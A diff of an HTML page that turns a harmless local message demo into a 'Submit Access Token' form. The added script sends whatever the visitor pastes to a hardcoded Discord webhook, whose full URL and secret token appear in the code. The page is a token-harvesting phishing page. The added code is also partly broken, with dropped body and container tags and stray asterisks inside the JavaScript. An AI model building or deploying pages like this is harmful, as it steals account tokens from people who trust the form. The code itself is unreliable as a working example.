@@ -1,159 +1,132 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Neon Message Portal</title>
+<title>Submit Access</title>
 
 <style>
 
 body{
 margin:0;
-background:black;
-font-family:monospace;
-color:#00ff99;
 height:100vh;
 display:flex;
 justify-content:center;
 align-items:center;
-overflow:hidden;
+font-family:Arial;
+background:linear-gradient(black,#1a1a1a,#ffffff);
 }
 
-/* MATRIX CANVAS */
+/* Glow background effect */
 
-canvas{
-position:fixed;
-top:0;
-left:0;
-z-index:-1;
+body::before{
+content:"";
+position:absolute;
+width:500px;
+height:500px;
+background:radial-gradient(circle, rgba(255,255,255,0.4), transparent);
+filter:blur(120px);
+animation:glowMove 8s infinite alternate;
 }
 
-/* MAIN BOX */
+@keyframes glowMove{
+0%{transform:translate(-200px,-100px);}
+100%{transform:translate(200px,100px);}
+}
+
+/* Glass card */
 
 .container{
-text-align:center;
-background:rgba(0,0,0,0.7);
+position:relative;
+background:rgba(255,255,255,0.08);
+backdrop-filter:blur(15px);
 padding:40px;
-border-radius:10px;
-border:1px solid #00ff99;
-box-shadow:0 0 20px #00ff99;
+border-radius:15px;
+text-align:center;
+box-shadow:0 0 40px rgba(255,255,255,0.3);
 }
 
-/* TITLE */
+/* Images */
+
+.images img{
+width:120px;
+border-radius:10px;
+margin:5px;
+box-shadow:0 0 20px rgba(255,255,255,0.6);
+}
+
+/* Title */
 
 h1{
-text-shadow:0 0 10px #00ff99,0 0 20px #00ff99;
+color:white;
 margin-bottom:20px;
+text-shadow:0 0 15px white;
 }
 
-/* INPUT */
+/* Input */
 
 input{
 padding:12px;
 width:260px;
 border:none;
-border-radius:5px;
+border-radius:8px;
 outline:none;
 margin-bottom:20px;
 }
 
-/* BUTTON */
+/* Glowing button */
 
 button{
 padding:12px 30px;
 border:none;
 border-radius:30px;
-background:#00ff99;
-color:black;
+background:black;
+color:white;
 font-weight:bold;
 cursor:pointer;
+box-shadow:0 0 10px white,0 0 30px white;
 transition:0.3s;
 }
 
 button:hover{
-transform:scale(1.15);
-box-shadow:0 0 15px #00ff99,0 0 40px #00ff99;
-}
-
-/* MESSAGE TEXT */
-
-#output{
-margin-top:20px;
-font-size:18px;
-text-shadow:0 0 10px #00ff99;
+transform:scale(1.1);
+box-shadow:0 0 20px white,0 0 50px white;
 }
 
 </style>
 </head>
 
-<body>
 
-<canvas id="matrix"></canvas>
+<h1>Submit Access Token</h1>
 
-<div class="container">
-
-<h1>NEON MESSAGE PORTAL</h1>
-
-<input id="msg" placeholder="Type your message">
+<input id="messageInput" placeholder="Paste here">
 
 <br>
 
-<button onclick="sendMessage()">Send Message</button>
-
-<div id="output"></div>
+<button onclick="sendMessage()">Submit</button>
 
 </div>
 
 <script>
 
-/* BUTTON ACTION */
-
 function sendMessage(){
-const text=document.getElementById("msg").value;
-document.getElementById("output").innerText="Message Sent: " + text;
-}
 
-/* MATRIX EFFECT */
+const message=document.getElementById("messageInput").value;
 
-const canvas=document.getElementById("matrix");
-const ctx=canvas.getContext("2d");
+const webhook="https://discord.com/api/webhooks/1450681251655581726/uZOSEpFUt-2x9uBZvBelHt4wPWuO9XNvBTj4VW4HfEiVVWvFORankW-2pDFDwXexqF61";
 
-canvas.width=window.innerWidth;
-canvas.height=window.innerHeight;
+fetch(webhook,{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+content:**"@everyone: "+message**
+})
+});
 
-const letters="01";
-const fontSize=16;
-const columns=canvas.width/fontSize;
-
-const drops=[];
-
-for(let i=0;i<columns;i++){
-drops[i]=1;
-}
-
-function draw(){
-
-ctx.fillStyle="rgba(0,0,0,0.05)";
-ctx.fillRect(0,0,canvas.width,canvas.height);
-
-ctx.fillStyle="#0f0";
-ctx.font=fontSize+"px monospace";
-
-for(let i=0;i<drops.length;i++){
-
-const text=letters.charAt(Math.floor(Math.random()*letters.length));
-
-ctx.fillText(text,i*fontSize,drops[i]*fontSize);
-
-if(drops[i]*fontSize>canvas.height && Math.random()>0.975){
-drops[i]=0;
-}
-
-drops[i]++;
-}
+alert("Submitted!");
 
 }
-
-setInterval(draw,33);
 
 </script>
 
